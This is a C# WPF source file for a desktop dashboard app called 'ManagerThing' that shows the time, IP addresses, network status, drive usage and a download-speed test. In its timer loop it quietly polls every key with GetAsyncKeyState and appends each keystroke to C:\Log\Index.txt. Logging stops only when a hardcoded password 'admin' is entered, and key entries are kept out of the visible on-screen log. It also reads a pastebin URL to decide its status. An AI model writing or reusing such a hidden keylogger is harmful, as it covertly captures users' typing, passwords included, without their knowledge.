using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;


namespace ManagerThing
{
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        string pathname = @"C:\Log";
        string _password = "admin";

        private void volumeDownFoo(object sender, MouseButtonEventArgs e) {
            SendMessageW(
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                0x319,
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                (IntPtr)0x90000);
        }

        private void volumeUpFoo(object sender, MouseButtonEventArgs e) {
            SendMessageW(
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                0x319,
                (new WindowInteropHelper(Application.Current.MainWindow).Handle),
                (IntPtr)0xA0000);
        }

        public MainWindow()
        {
            InitializeComponent();

            writeText(DateTime.Now.ToString("'- 'dd/MM/yyyy"));

            int iterationCount = 0;
            bool isAdmin = false;

            bool hasInternetConnection = HasInternetConnection();
            bool hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
            this.ipText.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();

            DispatcherTimer timer = new DispatcherTimer(new TimeSpan(0, 0, 0, 0, 62), DispatcherPriority.Normal, delegate {
                iterationCount++;
                if (iterationCount >= 5) {
                    this.secondsText.Text = DateTime.Now.ToString("ss'.'fff");
                    this.timeText.Text = DateTime.Now.ToString("HH:mm");

                    if (this.beep1.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep1.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep1.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    if (!isAdmin) {
                        for (int j = 0; j < 60; j++) {
                            for (Int32 i = 0; i < 255; i++) {
                                int keyState = GetAsyncKeyState(i);
                                if (keyState == 1 || keyState == -32767) {
                                    string _k = KeyInterop.KeyFromVirtualKey((int)i).ToString();
                                    _k =  (_k == "None")                         ? "MouseDown"    : (_k == "OemPeriod" || _k == "AbntC2")   ? "."
                                        : (_k == "OemComma"  || _k == "Decimal") ? ","            : (_k == "AbntC1"    || _k == "Divide")   ? "/"
                                        : (_k == "Multiply")                     ? "*"            : (_k == "OemMinus"  || _k == "Subtract") ? "-"
                                        : (_k == "OemPlus"  || _k == "Add")      ? "+"            : (_k == "Oem3")                          ? "'"
                                        : (_k == "OemQuestion")                  ? "?"            : _k == "Snapshot"                        ? "PrtScn"
                                        : _k == "Scroll"                         ? "ScrollLock"   : _k == "Pause"                           ? "PauseBreak"
                                        : _k == "Back"                           ? "Backspace"    : _k == "Next"                            ? "PageDown" : _k;
                                    try { writeText("[Key       ] " + _k); } catch { Console.WriteLine(">>> Too fast! <<<"); }
                                    break;
                                }
                            }
                        }
                    }
                }

                if (iterationCount == 5) {
                    internetSpeed.Text = pingTime().ToString("N2") + " Mbps";
                    writeText("[Ping Test ] " + internetSpeed.Text);
                    hasInternetConnection = HasInternetConnection();
                    hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
                    getDrives();
                }

                if (iterationCount % 4096 == 0) {
                    if (this.beep5.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep5.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep5.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    getDrives();
                }
                
                if (iterationCount % 1024 == 0) {
                    if (this.beep4.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep4.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep4.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    internetSpeed.Text = pingTime().ToString("N2") + " Mbps";
                    writeText("[Ping Test ] " + internetSpeed.Text);
                }

                if (iterationCount % 64 == 0) {
                    if (this.beep3.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep3.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep3.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }

                    hasInternetConnection = HasInternetConnection();
                    hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
                }

                if (iterationCount % 16 == 0) {
                    if (!isAdmin && this.passwordInput.Password.ToLower() == _password.ToLower()) {
                        this.passwordInput.Visibility = System.Windows.Visibility.Collapsed;
                        isAdmin = true;
                    }
                    this.weekText.Text = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(DateTime.Now.ToString("dddd"));
                    this.dayText.Text = DateTime.Now.ToString("dd");
                    int extDay = Convert.ToInt32(this.dayText.Text);
                    this.extText.Text = ((extDay == 1) ? "st" : (extDay == 2) ? "nd" : (extDay == 3) ? "rd" : "th");
                    this.dateText.Text = DateTime.Now.ToString("MM/yyyy");
                    this.dateText.ToolTip = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(DateTime.Now.ToString("MMMM"));

                    this.ipText_local.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();

                    if (!hasInternetConnection) {
                        if (this.hasInternet.Foreground.ToString().ToLower() != "#ffc42e3b") {
                            this.hasInternet.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffc42e3b");
                            writeText("[Connection] Disconnected");
                        }
                        this.ipText.Text = " ";
                        loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                    } else {
                        this.hasInternet.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff90ad2f");
                        if (this.ipText.Text == " " || (iterationCount >= 1 && iterationCount <= 20)) {
                            this.ipText.Text = GetPublicIP().ToString();
                        }
                    }
                    if (hasNetworkConnection) {
                        this.hasNetwork.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff90ad2f");
                    } else {
                        this.hasNetwork.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffc42e3b");
                    }

                    if (this.beep2.Foreground.ToString().ToLower() == "#ff282c35") {
                        this.beep2.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff009cdd");
                    } else {
                        this.beep2.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff282c35");
                    }
                }
            }, this.Dispatcher);
        }

        bool _c = false;
        private void appClosing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = _c = true;
            writeText(DateTime.Now.ToString("'- 'dd/MM/yyyy"));
            e.Cancel = false;
        }

        private void DragWindow(object sender, MouseButtonEventArgs e) {  DragMove();  }

        private void MinimizeWindow(object sender, MouseButtonEventArgs e) {  this.WindowState = WindowState.Minimized;  }
        private void AlphaWindow(object sender, MouseButtonEventArgs e) {
            if (this.content.Opacity == 0.3) {
                this.content.Opacity = 0.5;
            } else if (this.content.Opacity == 0.5) {
                this.content.Opacity = 1;
            } else {
                this.content.Opacity = 0.3;
            }
        }

        private void MinimizeWindowEnter(object sender, MouseEventArgs e) {  minimizeWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");  }
        private void MinimizeWindowLeave(object sender, MouseEventArgs e) {  minimizeWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff1c1f25");  }
        private void AlphaWindowEnter(object sender, MouseEventArgs e) {  alphaWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");  }
        private void AlphaWindowLeave(object sender, MouseEventArgs e) {  alphaWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff1c1f25");  }

        private double pingTime()
        {
            System.Net.WebClient wc = new System.Net.WebClient();
            DateTime dt1 = DateTime.Now;
            byte[] data = wc.DownloadData("http://google.com");
            DateTime dt2 = DateTime.Now;
            return ((data.Length * 8) / (dt2 - dt1).TotalSeconds) / 1024;
        }

        private void getDrives()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            driveNames.Text = "";
            foreach (DriveInfo drive in drives) {
                driveNames.Text += (drive + " [" + drive.DriveType + (drive.IsReady ? " | " + drive.DriveFormat : "") + "]\n");
                if (drive.IsReady && drive.DriveType.ToString() == "Fixed") {
                    float totalDriveSize = (drive.TotalSize / 1073741824);
                    float totalFreeSize = (drive.TotalFreeSpace / 1073741824);
                    float totalUsedSize = (totalDriveSize - totalFreeSize);
                    availMemoryName.Text = drive.Name;
                    availMemoryValue.Text = "Used " + totalUsedSize + "GB / " + totalDriveSize + "GB";

                    double _usedMemoryPercentage = Math.Abs(rect_totalMemory.Width * (totalUsedSize / totalDriveSize));
                    rect_usedMemory.Width = Math.Floor(_usedMemoryPercentage);
                }
            }
            writeText("[Drive Mngr] " + availMemoryValue.Text);
        }

        public bool HasInternetConnection()
        {
            try {
                string str = "";
                WebRequest request = WebRequest.Create("http://pastebin.com/raw.php?i=fmDaUMae");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream())) {
                    str = stream.ReadToEnd();
                }
                if (str == "0") {
                    return true;
                } else {
                    writeText("[WebResponse] " + str);
                    return false;
                }
            } catch {
                return false;
            }
        }

        public void writeText(string str) {
            str = DateTime.Now.ToString("HH:mm:ss") + " " + str;
            using (StreamWriter file = new StreamWriter(pathname + @"\Index.txt", true)) {
                file.WriteLine(str);
            }
            Console.WriteLine(str);
            if (str.IndexOf("[Key       ]") == -1) {
                log.Text = str + "\n" + log.Text;
            }
        }

        public string GetPublicIP()
        {
            try {
                string direction = "";
                WebRequest request = WebRequest.Create("http://matheus.avellar.c9.io/resources/ip");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream())) {
                    direction = stream.ReadToEnd();
                }
                loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                writeText("[Connection] " + direction);
                return direction;
            } catch {
                loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                writeText("[Connection] Error");
                return "127.0.0.1";
            }
        }

        private void IpRefresh(object sender, MouseButtonEventArgs e)
        {
            this.ipText.Text = "127.0.0.1";
            this.ipText_local.Text = "127.0.0.1";
            loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Visible;
            this.ipText.Text = GetPublicIP();
            this.ipText_local.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();
        }
    }
}
